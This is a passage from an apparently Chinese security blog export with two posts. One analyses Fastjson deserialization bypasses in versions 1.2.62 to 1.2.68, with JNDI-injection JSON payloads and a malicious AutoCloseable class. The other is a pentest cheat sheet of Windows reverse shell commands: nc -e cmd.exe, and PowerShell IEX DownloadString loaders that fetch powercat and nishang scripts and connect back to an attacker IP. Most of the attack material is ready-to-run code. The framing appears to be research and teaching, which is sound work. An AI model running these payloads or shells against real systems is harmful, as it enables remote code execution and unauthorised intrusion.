class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242043a777324565c5c5c4d5b4.png" alt="image-20210524172832135" style="zoom:80%;" />

<p><strong>Patch</strong></p>
<p>把<code>java.lang.Class</code>列入黑名单，把默认缓存从True改为False</p>
<h3 id="1-2-62漏洞"><a href="#1-2-62漏洞" class="headerlink" title="1.2.62漏洞"></a>1.2.62漏洞</h3><blockquote>
<p>使用新的Gadget绕过黑名单</p>
<p>需要 Fastjson版本 ≤ 1.2.62，并且需要开启setAutoTypeSupport</p>
<p>需要额外安装xbean-reflect（我的测试版本为3.4）</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.xbean.propertyeditor;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractConverter</span> <span class="keyword">extends</span> <span class="title class_">PropertyEditorSupport</span> <span class="keyword">implements</span> <span class="title class_">Converter</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.toObject(text.trim()); <span class="comment">// 调用toObject()函数</span></span><br><span class="line">        <span class="built_in">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.toObjectImpl(text.trim()); <span class="comment">// 调用toObjectImpl()函数</span></span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.xbean.propertyeditor;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiConverter</span> <span class="keyword">extends</span> <span class="title class_">AbstractConverter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="keyword">return</span> (Context)context.lookup(text); <span class="comment">// 调用lookup()函数实现JNDI注入</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyEditorException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里提供了一个新的思路就是可以从父类中找<code>set</code>函数，但也算不上是新的思路，只不过是找到第三方库里面的<code>lookup()</code>函数再向上回溯罢了 : )</p>
<p><strong>Patch</strong></p>
<p>扩充黑名单</p>
<h3 id="1-2-66漏洞"><a href="#1-2-66漏洞" class="headerlink" title="1.2.66漏洞"></a>1.2.66漏洞</h3><blockquote>
<p>使用新的Gadget绕过黑名单</p>
<p>需要 Fastjson版本 ≤ 1.2.66，并且需要开启setAutoTypeSupport</p>
<p>下面用到的Gadget都需要导入第三方库，直接搜就好，部分触发时必须使用parseObject()函数</p>
</blockquote>
<p>公开的Gadget一共有下面四个：</p>
<p><strong>JndiObjectFactory</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>触发代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.shiro.jndi;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiObjectFactory</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">JndiLocator</span> <span class="keyword">implements</span> <span class="title class_">Factory</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setResourceName</span><span class="params">(String resourceName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.resourceName = resourceName; <span class="comment">// 传入resourceName</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.requiredType != <span class="literal">null</span> ? <span class="built_in">this</span>.requiredType.cast(<span class="built_in">this</span>.lookup(<span class="built_in">this</span>.resourceName, <span class="built_in">this</span>.requiredType)) : <span class="built_in">this</span>.lookup(<span class="built_in">this</span>.resourceName); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> <span class="built_in">this</span>.requiredType != <span class="literal">null</span> ? <span class="built_in">this</span>.requiredType.getName() : <span class="string">&quot;object&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unable to look up &quot;</span> + typeName + <span class="string">&quot; with jndi name &#x27;&quot;</span> + <span class="built_in">this</span>.resourceName + <span class="string">&quot;&#x27;.&quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>AnterosDBCPConfig</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>触发代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> br.com.anteros.dbcp;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnterosDBCPConfig</span> <span class="keyword">implements</span> <span class="title class_">AnterosDBCPConfigMXBean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMetricRegistry</span><span class="params">(Object metricRegistry)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.metricsTrackerFactory != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;cannot use setMetricRegistry() and setMetricsTrackerFactory() together&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (metricRegistry != <span class="literal">null</span>) &#123;</span><br><span class="line">                metricRegistry = <span class="built_in">this</span>.getObjectOrPerformJndiLookup(metricRegistry); <span class="comment">// 传入metricRegistry</span></span><br><span class="line">                <span class="keyword">if</span> (!UtilityElf.safeIsAssignableFrom(metricRegistry, <span class="string">&quot;com.codahale.metrics.MetricRegistry&quot;</span>) &amp;&amp; !UtilityElf.safeIsAssignableFrom(metricRegistry, <span class="string">&quot;io.micrometer.core.instrument.MeterRegistry&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Class must be instance of com.codahale.metrics.MetricRegistry or io.micrometer.core.instrument.MeterRegistry&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.metricRegistry = metricRegistry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">getObjectOrPerformJndiLookup</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (object <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InitialContext</span> <span class="variable">initCtx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="keyword">return</span> initCtx.lookup((String)object); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(var3);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>CacheJndiTmLookup</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,\&quot;jndiNames\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>触发代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.ignite.cache.jta.jndi;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CacheJndiTmLookup</span> <span class="keyword">implements</span> <span class="title class_">CacheTmLookup</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setJndiNames</span><span class="params">(List&lt;String&gt; jndiNames)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jndiNames = jndiNames; <span class="comment">// 传入jndiNames</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">public</span> TransactionManager <span class="title function_">getTm</span><span class="params">()</span> <span class="keyword">throws</span> IgniteException &#123;</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">this</span>.jndiNames != <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> !<span class="built_in">this</span>.jndiNames.isEmpty();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.jndiNames.iterator(); <span class="comment">// 获取jndiNames</span></span><br><span class="line"></span><br><span class="line">            Object obj;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> (String)var2.next(); <span class="comment">// 获取jndiNames</span></span><br><span class="line">                obj = ctx.lookup(s); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">            &#125; <span class="keyword">while</span>(obj == <span class="literal">null</span> || !(obj <span class="keyword">instanceof</span> TransactionManager));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (TransactionManager)obj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IgniteException</span>(<span class="string">&quot;Unable to lookup TM by: &quot;</span> + <span class="built_in">this</span>.jndiNames, var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>JtaTransactionConfig</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>触发代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ibatis.sqlmap.engine.transaction.jta;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JtaTransactionConfig</span> <span class="keyword">extends</span> <span class="title class_">BaseTransactionConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties props)</span> <span class="keyword">throws</span> SQLException, TransactionException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">utxName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            utxName = (String)props.get(<span class="string">&quot;UserTransaction&quot;</span>); <span class="comment">// 这里需要传入一个Properties对象，然后里面UserTransaction属性的值</span></span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initCtx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="built_in">this</span>.userTransaction = (UserTransaction)initCtx.lookup(utxName); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SqlMapException</span>(<span class="string">&quot;Error initializing JtaTransactionConfig while looking up UserTransaction (&quot;</span> + utxName + <span class="string">&quot;).  Cause: &quot;</span> + var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>Patch</strong></p>
<p>扩充黑名单</p>
<h3 id="1-2-68漏洞"><a href="#1-2-68漏洞" class="headerlink" title="1.2.68漏洞"></a>1.2.68漏洞</h3><blockquote>
<p>1.2.68版本增加了新的安全参数<strong>safeMode</strong>，具体可参考这个<a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">链接</a>，当safeMode开启后，autoType会被完全禁用，但是默认情况下时关闭的，开启safeMode代码：<code>ParserConfig.getGlobalInstance().setSafeMode(true);</code> </p>
</blockquote>
<p><strong>恶意类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Exp</span> <span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123; </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;com.fastjson.Exp\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>在不开启<code>safeMode</code>的情况下，我们可以使用<code>java.lang.AutoCloseable</code>引入任意恶意类，和<strong>1.2.47</strong>版本的洞很类似，这里利用到的是<code>checkAutoType()</code>函数中<code>expectClass</code>参数，如果加载的类实现了<code>expectClass</code>接口，或者是属于<code>expectClass</code>的子类，那么<code>checkAutoType()</code>函数就会检测通过</p>
<p>利用这个特点，我们可以利用一个<code>TypeUtils.mappings</code>自带的类<code>java.lang.AutoCloseable</code>，这个类在进行反序列化时，如果检验到后面的字符串也是一个类的话，就会把自己作为<code>expectClass</code>调用<code>checkAutoType()</code>函数，这时候如果我们将恶意类编写成实现了<code>java.lang.AutoCloseable</code>接口的类，就可以成功绕过<code>checkAutoType()</code></p>
<p><strong>分析</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanDeserializer</span> <span class="keyword">implements</span> <span class="title class_">ObjectDeserializer</span> &#123;    </span><br><span class="line">	<span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName, Object object, <span class="type">int</span> features, <span class="type">int</span>[] setFlags)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">		<span class="keyword">if</span> (!ref.equals(<span class="built_in">this</span>.beanInfo.typeName) &amp;&amp; !parser.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">            refObj = getSeeAlso(config, <span class="built_in">this</span>.beanInfo, ref);</span><br><span class="line">            Class&lt;?&gt; userType = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (refObj == <span class="literal">null</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; expectClass = TypeUtils.getClass(type);</span><br><span class="line">                userType = config.checkAutoType(ref, expectClass, lexer.getFeatures()); <span class="comment">// ref实现了java.lang.AutoCloseable接口的恶意类，java.lang.AutoCloseable作为expectClass参数传入</span></span><br><span class="line">                refObj = parser.getConfig().getDeserializer(userType);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">typedObject</span> <span class="operator">=</span> ((ObjectDeserializer)refObj).deserialze(parser, userType, fieldName); <span class="comment">// 绕过成功之后进行反序列化</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>



<h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><ul>
<li>在1.2.43版本之前的漏洞主要是通过在类名中加入混淆字符而绕过<code>checkAutoType()</code>，特别是1.2.43版本的漏洞利用让我知道了即使json字符串不规范也是可以解析成功的</li>
<li>在1.2.45版本之后大部分都是通过第三方库寻找新的Gadget来绕过黑白名单，通过检查其实例创建函数或者set函数是否存在<code>lookup()</code>函数以及参数是否可控来挖掘</li>
<li>1.2.47版本的漏洞利用十分的巧妙，通过分析黑名单校验的<code>getClassFromMapping()</code>字段，想到用缓存进行绕过</li>
<li>1.2.68版本的漏洞利用也是同样巧妙，通过分析<code>expectClass</code>字段是否可控挖掘出了<code>java.lang.AutoCloseable</code>的Gadget，而且在Fastjson的可利用类中还存在着更多类似的利用，所以了解<code>checkAutoType()</code>方法中的可利用类十分必要，它们分别有：<ul>
<li>白名单（符合白名单条件的类）</li>
<li>TypeUtils.mappings （符合缓存映射中获取的类）</li>
<li>typeMapping （ParserConfig中本身带有的集合）</li>
<li>deserializers （符合反序列化器的类）</li>
</ul>
</li>
</ul>
<h2 id="哈希黑名单"><a href="#哈希黑名单" class="headerlink" title="哈希黑名单"></a>哈希黑名单</h2><p>由某些大哥爆破出来的哈希黑名单列表：<a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson blacklist</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/994/">Fastjson 流程分析及 RCE 分析</a></p>
<p><a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">Fastjson反序列化漏洞基础</a></p>
<p><a href="https://paper.seebug.org/1192/">Fastjson 反序列化漏洞史</a></p>
<p><a href="https://xz.aliyun.com/t/7878">某json &lt;&#x3D; 1.2.68 远程代码执行漏洞分析</a></p>
]]></content>
      <tags>
        <tag>漏洞研究</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透——Kerberos篇</title>
    <url>/2020/05/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E7%AF%87/</url>
    <content><![CDATA[<p>对内网渗透一些东西的小记录</p>
<span id="more"></span>

<h2 id="WinXP配置PowerShell"><a href="#WinXP配置PowerShell" class="headerlink" title="WinXP配置PowerShell"></a>WinXP配置PowerShell</h2><ol>
<li><p>安装.NET Framework 2.0 Service Pack 2</p>
<p><a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=1639">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=1639</a></p>
</li>
<li><p>安装WindowsXP-KB926140-v5-x86-CHS.exe</p>
<p><a href="https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html">https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html</a></p>
</li>
</ol>
<h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -vlp <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">nc.exe <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> <span class="number">9999</span> -e c:\WINDOWS\system32\<span class="built_in">cmd</span>.exe</span><br></pre></td></tr></table></figure>

<h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><p><a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a> </p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -lvp <span class="number">6666</span> 或 powercat -l -p <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object System.<span class="built_in">Net</span>.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);</span><br><span class="line">powercat -c <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> -p <span class="number">6666</span> -e <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>

<h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<h3 id="Reverse-TCP-Shell"><a href="#Reverse-TCP-Shell" class="headerlink" title="Reverse TCP Shell"></a>Reverse TCP Shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -lvp <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/<span class="number">9</span>a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> -port <span class="number">6666</span></span><br><span class="line">或</span><br><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> -port <span class="number">6666</span></span><br></pre></td></tr></table></figure>

<h3 id="Reverse-UDP-Shell"><a href="#Reverse-UDP-Shell" class="headerlink" title="Reverse UDP Shell"></a>Reverse UDP Shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -lvup <span class="number">53</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">159</span>.<span class="number">134</span>/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;);Invoke-PowerShellUdp -Reverse -IPAddress <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> -port <span class="number">53</span></span><br></pre></td></tr></table></figure>

<h3 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h3><p>icmpsh_m.py：<a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">sysctl -w <span class="built_in">net</span>.ipv4.icmp_echo_ignore_all=<span class="number">1</span> #忽略所有icmp包</span><br><span class="line">python icmpsh_m.py <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">130</span> #开启监听</span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>/nishang/Shells/Invoke-PowerShellIcmp.ps1&#x27;);Invoke-PowerShellIcmp -IPAddress <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>

